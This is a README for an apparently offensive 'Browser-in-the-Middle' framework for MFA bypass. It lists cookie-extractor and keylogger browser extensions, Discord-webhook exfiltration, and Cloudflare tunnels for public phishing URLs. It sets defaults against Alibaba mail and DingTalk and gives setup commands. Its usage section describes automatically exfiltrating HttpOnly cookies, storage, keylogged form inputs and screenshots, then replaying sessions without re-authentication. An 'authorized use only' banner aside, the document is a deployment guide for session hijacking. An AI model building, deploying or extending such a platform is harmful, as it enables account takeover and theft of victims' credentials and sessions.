# BitB Framework - Browser-in-the-Middle Attack Platform

> **⚠️ AUTHORIZED USE ONLY**
>
> This tool is designed for legitimate security assessments, penetration testing, and red team operations with explicit written authorization. Unauthorized use is illegal and unethical.

## Overview

BitB Framework is a sophisticated Browser-in-the-Middle (BitB) attack platform designed for authorized MFA bypass assessments. It provides:

- **Isolated Browser Containers**: Firefox instances with VNC access for interactive sessions
- **Session Interception**: Cookie and credential extraction from target applications
- **Replay Capability**: Restore captured sessions in fresh browser instances
- **Chinese Character Support**: Full CJK font rendering for Alibaba/DingTalk targets
- **Web Dashboard**: Centralized management of attack sessions
- **Optional Cloudflare Tunnels**: If available, the app can create a temporary public URL for a session; otherwise it continues without one

## Project Structure

```
bitb-framework/
├── docker-compose.yml
├── Dockerfile.firefox-custom
├── requirements.txt
├── config/
│   ├── cloudflared/
│   └── extensions/
├── src/
│   ├── app.py                 # Main Flask/FastAPI dashboard
│   ├── session_manager.py     # Container lifecycle management
│   ├── cloudflare_manager.py  # pycloudflared integration
│   ├── auth.py               # IP access control
│   └── exfil_handler.py      # Discord webhook + replay logic
├── extensions/
│   ├── cookie-extractor/
│   │   ├── manifest.json
│   │   ├── background.js
│   │   ├── content.js
│   │   └── config.js
│   └── keylogger/
│       ├── manifest.json
│       ├── background.js
│       ├── content.js
│       └── config.js
├── scripts/
│   └── start-firefox.sh
├── templates/
│   └── dashboard.html
├── static/
│   └── css/
├── .env.example
└── README.md
```

## Quick Start

### Prerequisites

- Docker & Docker Compose
- Discord webhook (for notifications, optional)
- Cloudflare tooling (optional, only if you want temporary public tunnel URLs)

### Installation

1. Clone and configure:
```bash
git clone <repo>
cd bitb-framework
cp .env.example .env
```

2. Create and activate a Python virtual environment on Linux:
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

3. Edit `.env`:
```bash
# Required
ADMIN_IPS=your.ip.address.here,another.ip.here

# Optional
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
SECRET_KEY=your-random-secret-key
MAX_CONTAINERS=10
SESSION_TIMEOUT=3600
EXFIL_ENDPOINT=http://localhost:8080
```

4. Build and run with Docker on Linux:
```bash
docker compose up -d --build
```

5. Access dashboard:
```
http://localhost:8080
```

## Usage

### Launching a Session

1. Click **"Launch Browser"** in the dashboard
2. Enter target URL (default: `https://qiye.aliyun.com/`)
3. Wait for container to spawn (30-60 seconds)
4. Click **"Open VNC"** to access the browser

### Session Exfiltration

Sessions are automatically exfiltrated when:
- User navigates to target domains (qiye.aliyun.com, dingtalk.com)
- Manual trigger from dashboard
- Periodic background extraction (30s interval on target sites)

Exfiltrated data includes:
- All cookies (including HttpOnly)
- localStorage and sessionStorage
- Form inputs (keylogged)
- Screenshots
- Page URLs

### Replay Sessions

1. Click **"Replay"** on an exfiltrated session
2. A new container launches with injected cookies
3. Access via the provided VNC link
4. The session resumes without re-authentication

## License

MIT
